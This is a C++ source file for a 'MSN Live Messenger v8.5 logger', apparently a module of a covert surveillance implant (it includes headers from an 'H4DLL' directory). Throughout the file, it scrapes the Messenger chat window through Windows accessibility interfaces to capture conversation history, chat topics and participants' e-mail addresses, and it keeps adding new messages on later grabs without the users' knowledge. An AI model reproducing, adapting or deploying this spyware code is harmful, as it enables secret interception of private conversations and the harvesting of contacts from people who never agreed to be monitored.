/*
* MSN Live Messenger v8.5 logger
*
* Coded by: Quequero
* Date: 14/Mar/2008
*
*/

#include <exception>
#include <new>

using namespace std;

#include "QMsnLive85.h"
#include "../../H4DLL/common.h"
#define MIN_SEARCH_LENGTH 200

PWCHAR QMsnLive85::wChatTree[] = {
	(PWCHAR)L"IMWindowClass",
	(PWCHAR)L"DirectUIHWND",
	0
};

PWCHAR QMsnLive85::wMarker[] = {
	(PWCHAR)L" Fine conversazione - Inizio conversazione ",		     // IT
	(PWCHAR)L" End of conversation - Start of conversation ",	     // EN
	(PWCHAR)L" Fin de la conversación - Inicio de la conversación ", // ES
	(PWCHAR)L" מפריד", // IL
	0
};

QMsnLive85::QMsnLive85(HWND hw) : QMsnLive(hw)
{

}

QMsnLive85::~QMsnLive85()
{

}

BOOL QMsnLive85::GrabHistory()
{
	LONG uCount, i = 0;
	BSTR bChat;
	PWCHAR wHistory, wLine = NULL;

	if(!FNC(IsWindow)(ole.GetHandle()))
		return FALSE;

	if(hwChat == NULL)
		return FALSE;

	ole.SetHandle(hwChat);

	if(ole.SetInterface() == FALSE){
		ole.Clean();
		return FALSE;
	}

	uCount = ole.GetDispatchTypeCount(ROLE_SYSTEM_TEXT);

	if(uCount == 3) // Niente feature o chat con piu' partecipanti
		ole.SetDispatchInterfaceFromType(ROLE_SYSTEM_TEXT, 1);
	else			// User con feature
		ole.SetDispatchInterfaceFromType(ROLE_SYSTEM_TEXT, 2);

	// Se e' il primo grab di questo oggetto, prendi solo l'ultima
	// riga, in questo modo skippiamo tutta la history precedente.
	if(bFirstGrab){
		if(ole.GetValueFromContainer(&bChat, CHILDID_SELF) == FALSE || bChat == NULL){
			properties.SetUpdated(FALSE);
			ole.Clean();
			return FALSE;
		}

		// In una chat vuota cmq c'e' un "a capo" inserito di default
		// dal programma
		if(wcslen(bChat) == 1){
			SAFE_SYSFREESTR(bChat);
			ole.Clean();
			return TRUE;
		}

		// Cerca il terminatore, se non c'e' stiamo leggendo la history
		i = 0;

		while(wMarker[i]){
			wLine = wcsstr(bChat, wMarker[i]);

			if(wLine)
				break;

			i++;
		}

		// Se c'e' il terminatore, leggiamo la riga
		if(wLine){
			/*if(wcsstr(wLine + wcslen(wMarker[i]), wMarker[i])){
				wLine = wcsstr(wLine + wcslen(wMarker[i]), wMarker[i]);
			}*/

			uCount = wLine - bChat;
			wLine = new(std::nothrow) WCHAR[uCount + 1];

			if(wLine == NULL){
				SAFE_SYSFREESTR(bChat);
				ole.Clean();
				return FALSE;
			}

			memset(wLine, 0x00, (uCount + 1) * sizeof(WCHAR));
			memcpy(wLine, bChat, uCount * sizeof(WCHAR));

			properties.ClearHistory();
			properties.SetHistory(wLine);
			properties.ConvertNewLine();
			properties.SetUpdated(TRUE);

			delete[] wLine;
			wLine = NULL;
		}else{ // Altrimenti catturiamo solo l'ultima riga
			if(properties.SetHistory(bChat)){
				properties.ConvertNewLine();
				properties.CleanHistory();
				properties.SetUpdated(TRUE);
			}
		}

		SAFE_SYSFREESTR(bChat);
		bChat = NULL;
		bFirstGrab = FALSE;
		ole.Clean();
		return TRUE;
	}

	// Se siamo qui, non e' il primo grab
	// Tronca la history se e' gia' stata acquisita
	if(properties.GetAcquiredStatus()){
		properties.TruncateHistory();

		// Acquisiamo il contenuto della finestra
		if(ole.GetValueFromContainer(&bChat, CHILDID_SELF) == FALSE || bChat == NULL){
			ole.Clean();
			return FALSE;
		}

		// Cerca il terminatore, se non c'e' stiamo leggendo la history
		i = 0;

		while(wMarker[i]){
			wLine = wcsstr(bChat, wMarker[i]);

			if(wLine)
				break;

			i++;
		}

		if(wLine){ // C'e' il marcatore
			/*if(wcsstr(wLine + wcslen(wMarker[i]), wMarker[i])){
				wLine = wcsstr(wLine + wcslen(wMarker[i]), wMarker[i]);
			}*/

			uCount = wLine - bChat;
			wLine = new(std::nothrow) WCHAR[uCount + 1];

			if(wLine == NULL){
				SAFE_SYSFREESTR(bChat);
				ole.Clean();
				return FALSE;
			}

			memset(wLine, 0x00, (uCount + 1) * sizeof(WCHAR));
			memcpy(wLine, bChat, uCount * sizeof(WCHAR));

			properties.ClearHistory();
			properties.SetHistory(wLine);
			properties.ConvertNewLine();
			properties.SetUpdated(TRUE);

			delete[] wLine;
			wLine = NULL;
			SAFE_SYSFREESTR(bChat);
			bChat = NULL;
		}else{ // Non c'e'
			wLine = new(std::nothrow) WCHAR[wcslen(bChat) + 1];

			if(wLine == NULL){
				SAFE_SYSFREESTR(bChat);
				ole.Clean();
				return FALSE;
			}

			memset(wLine, 0x00, (wcslen(bChat) + 1) * sizeof(WCHAR));
			memcpy(wLine, bChat, wcslen(bChat) * sizeof(WCHAR));
			properties.ConvertNewLine(wLine);
			SAFE_SYSFREESTR(bChat);
			bChat = NULL;

			// Cerchiamo dove si trova l'ultima parte acquisita
			wHistory = properties.wcsrstr(wLine, properties.GetHistory());		

			if(wHistory == NULL){
				delete[] wLine;
				wLine = NULL;

				//properties.AppendHistory(wLine);
				properties.SetUpdated(FALSE);
			} else if(wHistory == properties.GetHistory()){
				properties.SetUpdated(FALSE);
			}else{
				uCount = properties.GetHistoryLength();

				if(wcslen(wHistory) == uCount){
					properties.SetUpdated(FALSE);
				}else{
					properties.ClearHistory();
					properties.SetHistory(wHistory + uCount);
					properties.SetUpdated(TRUE);
				}
			}

			if(wLine){
				delete[] wLine;
				wLine = NULL;
			}
		}
	}else{ // Parti dall'ultima riga e confronta
		// Acquisiamo il contenuto della finestra
		if(ole.GetValueFromContainer(&bChat, CHILDID_SELF) == FALSE || bChat == NULL){
			ole.Clean();
			return FALSE;
		}

		// Cerca l'ultima riga della chat che abbiamo nella nostra history
		uCount = properties.GetHistoryLength();
		wHistory = properties.GetHistory();

		if(uCount > MIN_SEARCH_LENGTH)
			wHistory += uCount - MIN_SEARCH_LENGTH;
		
		if(!wcslen(bChat)){
			SAFE_SYSFREESTR(bChat);
			ole.Clean();
			return TRUE;
		}

		wLine = new(std::nothrow) WCHAR[wcslen(bChat) + 1];

		if(wLine == NULL){
			SAFE_SYSFREESTR(bChat);
			ole.Clean();
			return FALSE;
		}

		memset(wLine, 0x00, (wcslen(bChat) + 1) * sizeof(WCHAR));
		memcpy(wLine, bChat, wcslen(bChat) * sizeof(WCHAR));
		properties.ConvertNewLine(wLine);

		// Cerchiamo dove si trova l'ultima parte acquisita
		wHistory = wcsstr(wLine, wHistory);	

		if(!wcsncmp(wHistory, properties.GetHistory(), uCount)){
			properties.SetUpdated(FALSE);
		}else{
			properties.AppendHistory(wHistory + uCount);
			properties.SetUpdated(TRUE);
		}

		SAFE_SYSFREESTR(bChat);
		bChat = NULL;

		if(wLine){
			delete[] wLine;
			wLine = NULL;
		}
	}

	if(wLine)
		delete[] wLine;

	ole.Clean();
	return TRUE;
}

BOOL QMsnLive85::GrabTopic()
{
	UINT uCount;
	BSTR bChat;

	ole.SetHandle(hwChat);

	if(ole.SetInterface() == FALSE){
		ole.Clean();
		return FALSE;
	}

	uCount = ole.GetDispatchTypeCount(ROLE_SYSTEM_TEXT);
	ole.SetDispatchInterfaceFromType(ROLE_SYSTEM_TEXT, 0);

	if(uCount == 3)
		properties.SetId((PWCHAR)L"");
	else{
		if(ole.GetLineFromContainer(&bChat, 0)){
			properties.SetId(bChat);
			SAFE_SYSFREESTR(bChat);
		}else{
			properties.SetId((PWCHAR)L"");
		}
	}

	ole.Clean();
	return TRUE;
}

/**
* Prende l'elenco dei partecipanti e lo mette nelle proprieta'.
*/
BOOL QMsnLive85::GrabUserList()
{
	UINT uCount, i;
	BSTR bDesc;
	BOOL bFound = FALSE;

	if(!FNC(IsWindow)(ole.GetHandle())){
		properties.SetUsers((PWCHAR)L"");
		return FALSE;
	}

	ole.SetHandle(hwChat);

	if(ole.SetInterface() == FALSE){
		ole.Clean();
		return FALSE;
	}

	properties.ClearUsersList();

	uCount = ole.GetDispatchTypeCount(ROLE_SYSTEM_TEXT);

	if(uCount == 3) // Niente feature o chat con piu' partecipanti
		ole.SetDispatchInterfaceFromType(ROLE_SYSTEM_TEXT, 0);
	else			// User con feature
		ole.SetDispatchInterfaceFromType(ROLE_SYSTEM_TEXT, 1);

	// Prendi l'indirizzo dell'utente principale
	if(ole.GetValueFromContainer(&bDesc, CHILDID_SELF) == FALSE || bDesc == NULL){
		ole.Clean();
		return FALSE;
	}

	properties.AppendUser(bDesc, FALSE);
	SAFE_SYSFREESTR(bDesc);
	bDesc = NULL;

	uCount = ole.GetDispatchTypeCount(ROLE_SYSTEM_BUTTONMENU);

	for(i = 0; i < uCount; i++){
		ole.SetDispatchInterfaceFromType(ROLE_SYSTEM_BUTTONMENU, i);
		
		if(ole.GetDescriptionFromContainer(&bDesc, 0) == FALSE || bDesc == NULL){
			ole.Clean();
			return FALSE;
		}

		WCHAR wLast;
		PWCHAR pwFirst;
		wLast = bDesc[wcslen(bDesc) - 1];

		// I contatti sono nella forma <user@provider.tld>
		if(!wcsncmp(&wLast, L">", 1)){
			if((pwFirst = wcsrchr(bDesc, '<')) == NULL)
				continue;
			
			if(!bFound)
				properties.AppendTerminator();

			if(i < uCount - 1)
				properties.AppendUser(pwFirst, TRUE);
			else
				properties.AppendUser(pwFirst, FALSE);

			bFound = TRUE;
		}

		SAFE_SYSFREESTR(bDesc);
		bDesc = NULL;
	}

	ole.Clean();
	return TRUE;
}

